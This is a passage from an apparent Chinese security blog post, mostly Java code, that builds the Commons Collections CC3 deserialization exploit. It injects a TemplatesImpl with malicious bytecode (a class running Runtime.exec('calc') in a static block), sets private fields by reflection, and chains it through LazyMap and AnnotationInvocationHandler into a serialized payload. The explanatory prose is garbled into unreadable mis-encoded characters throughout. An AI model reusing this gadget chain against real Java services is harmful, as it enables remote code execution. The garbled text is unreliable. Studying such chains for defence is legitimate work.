src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306031734855.png" alt="image-20230603173407614"></p><h2 id="Âà©Áî®"><a href="#Âà©Áî®" class="headerlink" title="Âà©Áî®"></a>Âà©Áî®</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">templates.newTransformer();</span><br></pre></td></tr></table></figure><p>‰∏äÈù¢‰∏§Ë°å‰ª£Á†ÅÂÖ∂ÂÆûÂ∞±ÊòØÂëΩ‰ª§ÊâßË°åÁöÑ‰ª£Á†ÅÔºå‰ΩÜÊòØËÇØÂÆöÊúâÂæàÂ§öÈôêÂà∂Êù°‰ª∂ËÆ©ÂÆÉÊó†Ê≥ïÊâßË°åÔºåÊâÄ‰ª•Êé•‰∏ãÊù•Â∞±ÊòØÊª°Ë∂≥ÊâÄÊúâÊù°‰ª∂ËÆ©ÂÆÉÊâßË°åÔºåÈ¶ñÂÖàÊòØ‰∏ãÈù¢ÁöÑËøô‰∫õÊù°‰ª∂<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306031734199.png" alt="image-20230603173436099"><br><code>_name</code>‰∏çËÉΩ‰∏∫Á©∫Ôºå<code>_class</code>ÂøÖÈ°ª‰∏∫Á©∫ËøôÊ†∑ÊâçËÉΩËøõÂÖ•<code>defineTransletClasses()</code>ÊñπÊ≥ïÔºåÁÑ∂ÂêéË∑üËøõËøô‰∏™ÊñπÊ≥ï<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306031734897.png" alt="image-20230603173450789"><br><code>_bytecodes</code>‰∏çËÉΩ‰∏∫Á©∫ÔºåÂê¶ÂàôÊäõÂºÇÂ∏∏Ôºå<code>_tfactory</code>ÈúÄË¶ÅË∞ÉÊñπÊ≥ïÊâÄ‰ª•‰πüÈúÄË¶ÅËµãÂÄºÔºåÁÑ∂ÂêéÂºÄÂßãÊûÑÈÄ†EXP</p><h2 id="ÊûÑÈÄ†EXP"><a href="#ÊûÑÈÄ†EXP" class="headerlink" title="ÊûÑÈÄ†EXP"></a>ÊûÑÈÄ†EXP</h2><p>ÈÄöËøáÂèçÂ∞ÑËé∑ÂèñÂ±ûÊÄßÔºå<code>_name</code>ÁöÑÂÄºÊòØStringÂÖàÈöè‰æøËµã‰∏Ä‰∏™Ôºå<code>_class</code>ÂàùÂßãÂÄºÂ∞±‰∏∫Á©∫‰∏çÁî®ÁÆ°ÔºåÁÑ∂ÂêéÊòØ<code>_bytecodes</code>ÊòØ‰∏Ä‰∏™‰∫åÁª¥Êï∞ÁªÑÔºå‰ΩÜÊòØ‰º†ÂÖ•defineClassÊñπÊ≥ïÁöÑÂÄºÊòØ‰∏ÄÁª¥Êï∞ÁªÑ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Class <span class="title function_">defineClass</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] b)</span> &#123;  </span><br><span class="line">    <span class="keyword">return</span> defineClass(<span class="literal">null</span>, b, <span class="number">0</span>, b.length);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ËÄåËøô‰∏™‰∏ÄÁª¥Êï∞ÁªÑÂ≠òÊîæÁöÑÊòØÊÅ∂ÊÑèÂ≠óËäÇÁ†ÅÔºå‰πüÂ∞±ÊòØÂëΩ‰ª§ÊâßË°åÁöÑclassÊñá‰ª∂ÔºåÊâÄ‰ª•Êàë‰ª¨ÂÖàÊääËøô‰∏™ÂÜôÂÆå</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;  </span><br><span class="line">    <span class="keyword">static</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Ëøô‰∏™‰πüÂèØ‰ª•ÊîæÊûÑÈÄ†ÂáΩÊï∞ÈáåÈù¢ÔºåÂÆû‰æãÂåñÁöÑÊó∂ÂÄôËÉΩÂä†ËΩΩÂ∞±Ë°åÔºåËøôÈÉ®ÂàÜÂØπ‰∫éÁöÑ‰ª£Á†ÅÂ¶Ç‰∏ã</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\java-tools\\CCÈìæ\\CC3\\&quot;</span>));  </span><br><span class="line"><span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br></pre></td></tr></table></figure><p>ËøôÊ†∑Â∞±ÂÆåÊàê‰∫Ü‰∫åÁª¥Êï∞ÁªÑËµãÂÄºÔºå‰º†ÁªôdefineClassÊñπÊ≥ïÁöÑ‰πüÊòØÂ≠òÊîæÊÅ∂ÊÑèÂ≠óËäÇÁ†ÅÁöÑ‰∏ÄÁª¥Êï∞ÁªÑ<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306031735515.png" alt="image-20230603173507470"><br>Âæ™ÁéØÂèñÂÄºÔºåÁõ∏ÂΩì‰∫éÁ¨¨‰∏Ä‰∏™ÂÄºÂ∞±ÊòØÂ≠òÊîæÊÅ∂ÊÑèÂ≠óËäÇÁ†ÅÁöÑ‰∏ÄÁª¥Êï∞ÁªÑÔºåËøô‰∏™<code>_bytecodes</code>ËµãÂÄºÂ∞±Ëß£ÂÜ≥‰∫Ü<br>ÁÑ∂ÂêéÊòØ<code>_tfactory</code>ËµãÂÄºÔºåÂÆÉÁöÑÂÆö‰πâÂ¶Ç‰∏ã</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> <span class="type">TransformerFactoryImpl</span> <span class="variable">_tfactory</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br></pre></td></tr></table></figure><p>Êúâ‰∏™transientË°®Á§∫ÂÆÉÊòØ‰∏™‰∏çÂèØÂ∫èÂàóÂåñÁöÑÂèòÈáèÔºåÈÇ£‰πàÊàë‰ª¨‰º†ÂÄºÂ∞±Ê≤°ÊúâÊÑè‰πâ‰∫ÜÔºåÂèçÂ∫èÂàóÂåñÁöÑÊó∂ÂÄôÂ∞±‰ºö‰∏¢Â§±ÔºåÊúÄÂêéÂú®readObject‰∏≠ÊâæÂà∞ÂÆÉÁöÑÂàùÂßãÂÆö‰πâ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_tfactory = <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>();</span><br></pre></td></tr></table></figure><p>ËøôÈáå‰∏ç‰∏∫Á©∫ÔºåÊâÄ‰ª•Áõ¥Êé•ÂèçÂ∞ÑËµãÂÄº‰∏∫TransformerFactoryImplÂç≥ÂèØÔºåÂà∞ËøôÈáåËØ•Êª°Ë∂≥ÁöÑÊù°‰ª∂ÈÉΩÊª°Ë∂≥‰∫ÜÔºå‰ª£Á†ÅÂ¶Ç‰∏ã</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">tclass</span> <span class="operator">=</span> templates.getClass();  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);  </span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);  </span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://java-tools/test.class&quot;</span>));  </span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;  </span><br><span class="line">        bytecodes.set(templates,codes);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);  </span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">  </span><br><span class="line">        templates.newTransformer();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>‰ΩÜÊòØÂà∞ËøôÈáåÊä•‰∫ÜÁ©∫ÊåáÈíàÈîôËØØ<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306031735495.png" alt="image-20230603173521394"><br>Êú¨Êù•ÊÉ≥Ë∞ÉËØï‰∏Ä‰∏ãÔºå‰ΩÜÊòØÂèëÁé∞ÁéØÂ¢ÉÂ•ΩÂÉèÊúâÁÇπÈóÆÈ¢ò‰∏çËÉΩÂú®Ëøô‰∏™Á±ª‰∏ãË∞ÉËØïÔºåÁõ¥Êé•Âéª422ÁúãÊä•Èîô‰πüË°åÔºå<br>Âú®418Ë°å‰ºöÂà§Êñ≠ÊÅ∂ÊÑèÁ±ªÊòØÂê¶ÁªßÊâø‰∫ÜABSTRACT_TRANSLETËøô‰∏™Á±ªÂê¶ÂàôÊä•ÈîôÔºåÂç≥<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET))</span><br></pre></td></tr></table></figure><p>ÊàñËÄÖÊàë‰ª¨Áªô<code>_auxClasses</code>ËµãÂÄºËÆ©ÂÆÉ‰∏ç‰∏∫Á©∫Ôºå‰ΩÜÊòØËøôÊ†∑<code>_transletIndex</code>‰∏∫-1‰ºöÂú®‰∏ãÈù¢ÁöÑÂà§Êñ≠Áõ¥Êé•Ë∑≥Âá∫Á®ãÂ∫èÔºåËøô‰∏™ÊñπÊ≥ïÂ∞±‰∏çÂèØÂèñÔºåÊâÄ‰ª•Áõ¥Êé•ËÆ©ÊÅ∂ÊÑèÁ±ªÁªßÊâøAbstractTransletÁ±ªÔºåÂ¶Ç‰∏ã</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span>&#123;  </span><br><span class="line">    <span class="keyword">static</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;  </span><br><span class="line">          </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÊâßË°å‰ª£Á†ÅÂºπÂá∫ÊàêÂäü<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306031735250.png" alt="image-20230603173533124"></p><h2 id="CC1-ÁöÑTemplatesImplÁöÑÂÆûÁé∞ÊñπÂºè"><a href="#CC1-ÁöÑTemplatesImplÁöÑÂÆûÁé∞ÊñπÂºè" class="headerlink" title="CC1 ÁöÑTemplatesImplÁöÑÂÆûÁé∞ÊñπÂºè"></a>CC1 ÁöÑTemplatesImplÁöÑÂÆûÁé∞ÊñπÂºè</h2><p>Áî±‰∫é‰∏äÈù¢ÁöÑÈÉ®ÂàÜÊàë‰ª¨Âè™ÊòØÊõ¥ÊîπÁöÑÊúÄÂêéÂëΩ‰ª§ÊâßË°åÁöÑÊñπÊ≥ïÔºåÂâçÈù¢ÁöÑÈìæÂ≠ê‰ªçÁÑ∂Ê≤°ÊúâÂèòÔºåÊâÄ‰ª•ËøôÈáåÂíåCC1ÁöÑÂâçÂçäÊÆµÁªìÂêà‰∏Ä‰∏ãÔºå‰ª£Á†ÅÂ¶Ç‰∏ã</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">tclass</span> <span class="operator">=</span> templates.getClass();  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);  </span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);  </span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://java-tools/test.class&quot;</span>));  </span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;  </span><br><span class="line">        bytecodes.set(templates,codes);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);  </span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//        templates.newTransformer();  </span></span><br><span class="line">  </span><br><span class="line">        Transformer[] transformers= <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">        chainedTransformer.transform(<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//ÊúÄÂêéËøôÈáåËµãÂÄºÊòØÂõ†‰∏∫new ConstantTransformer(templates)ËøôÈáåÂÆö‰πâÁöÑÁ±ªÈúÄË¶Å‰∏Ä‰∏™ÂèÇÊï∞</span></span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306031735670.png" alt="image-20230603173548540"><br>ÁÑ∂ÂêéÊääCC1ÂêéÈù¢ÁöÑÂÖ®ÈÉ®ÊãøËøáÊù•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">tclass</span> <span class="operator">=</span> templates.getClass();  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);  </span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);  </span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://java-tools/test.class&quot;</span>));  </span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;  </span><br><span class="line">        bytecodes.set(templates,codes);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);  </span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//        templates.newTransformer();  </span></span><br><span class="line">  </span><br><span class="line">        Transformer[] transformers= <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line"><span class="comment">//        chainedTransformer.transform(1);  </span></span><br><span class="line">  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        Map&lt;Object,Object&gt; decorateMap = LazyMap.decorate(hashMap,  chainedTransformer);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  </span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Class.class, Map.class&#125;);  </span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) declaredConstructor.newInstance(Override.class, decorateMap);  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, invocationHandler);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxyMap);  </span><br><span class="line">        <span class="comment">//InvocationHandlerËß£ÂÜ≥proxyMap‰∏çËÉΩÂ∫èÂàóÂåñÔºåÁÑ∂ÂêéÈÄöËøáÊûÑÈÄ†ÊñπÊ≥ïÂ∞Ü‰ª£ÁêÜÂØπË±°proxyMapËµãÂÄºÁªômemberValues  </span></span><br><span class="line">  </span><br><span class="line">        <span class="comment">//Â∫èÂàóÂåñ‰∏éÂèçÂ∫èÂàóÂåñ  </span></span><br><span class="line"><span class="comment">//        serialize(invocationHandler);  </span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÊàêÂäüÂºπÂá∫ËÆ°ÁÆóÂô®<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306031736820.png" alt="image-20230603173603684"><br>ÁõÆÂâçÁöÑÊµÅÁ®ãÂõæÂ¶Ç‰∏ã<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306031736425.png" alt="image-20230603173633352"><br>CC6ÂíåËøô‰∏™‰πüÂ∑Æ‰∏çÂ§öÁöÑ‰πüËÉΩÈÄö</p><h2 id="ÁªßÁª≠ÂàÜÊûêCC3"><a href="#ÁªßÁª≠ÂàÜÊûêCC3" class="headerlink" title="ÁªßÁª≠ÂàÜÊûêCC3"></a>ÁªßÁª≠ÂàÜÊûêCC3</h2><p>Áé∞Âú®Êàë‰ª¨Â∑≤ÁªèÊâæÂà∞‰∫ÜÂëΩ‰ª§ÊâßË°åÁöÑÁ±ªÂíåÊñπÊ≥ï‰πüÂ∞±ÊòØ<code>TemplatesImpl.newTransformer()</code>ÂâçÈù¢ÊòØÂíåCC1ÁöÑÂâçÂçäÈÉ®ÂàÜÈìæËµ∑Êù•ÁöÑÁõ∏ÂΩì‰∫éÂ¶ÇÊûúËøáÊª§‰∫Ü<code>Runtime.exec()</code>ÈÇ£Â∞±ÂèØ‰ª•Êç¢ÁßçÊñπÊ≥ïÊù•ÊâßË°å‰ª£Á†ÅÔºåÂ¶ÇÊûúËøáÊª§‰∫Ü<code>InvokerTransform.transform</code>Âë¢Ôºü‰πüÊòØÊúâÂà´ÁöÑÈìæÊù•Âà∞ÂëΩ‰ª§ÊâßË°åÁöÑÔºåËøôÂ∞±ÊòØCC3ÔºåÊâÄ‰ª•Êàë‰ª¨ÁªßÁª≠‰ΩøÁî®find usagesÂæÄÂâçÊâæÔºåÊúÄÁªàÊâæÂà∞‰∫ÜTrAXFilterËøô‰∏™Á±ª<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306031736796.png" alt="image-20230603173655608"><br>Ëøô‰∏™Á±ª‰πüÊòØ‰∏çËÉΩÂ∫èÂàóÂåñÁöÑÊ≤°ÂäûÊ≥ï‰º†ÂèÇ(ÂÖ∂ÂÆûËøôÈáåÊúâÁÇπ‰∏çÂ§™ÊòéÁôΩ‰∏çËÉΩ‰º†ÂèÇÊÑèÂë≥ÁùÄ‰ªÄ‰πà)ÔºåÈÇ£‰πàÂè™ËÉΩ‰ªéÊûÑÈÄ†ÊñπÊ≥ïÂÖ•Êâã</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_transformer = (TransformerImpl) templates.newTransformer();</span><br></pre></td></tr></table></figure><p>ÂèØ‰ª•ÁúãÂà∞Âè™Ë¶ÅÊâßË°å‰∫ÜÊûÑÈÄ†ÊñπÊ≥ïÂ∞±ËÉΩÂà∞<code>newTransformer()</code>ÂëΩ‰ª§ÊâßË°åÔºåÂú®ËøôÈáåCC3‰ΩúËÄÖË∞ÉÁî®‰∫Ü‰∏Ä‰∏™Êñ∞ÁöÑÁ±ª<code>InstantiateTransformer</code>Êàë‰ª¨ÂéªÁúã‰∏Ä‰∏ãÂÆÉÁöÑ<code>transform</code>ÊñπÊ≥ï<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306031737397.png" alt="image-20230603173706325"><br>ËøôÊ†∑Â∞±ÂàöÂàöÂ•ΩÁ¨¶ÂêàÈúÄÊ±ÇÁÑ∂ÂêéÊûÑÈÄ†EXP</p><h2 id="CC3-EXP"><a href="#CC3-EXP" class="headerlink" title="CC3 EXP"></a>CC3 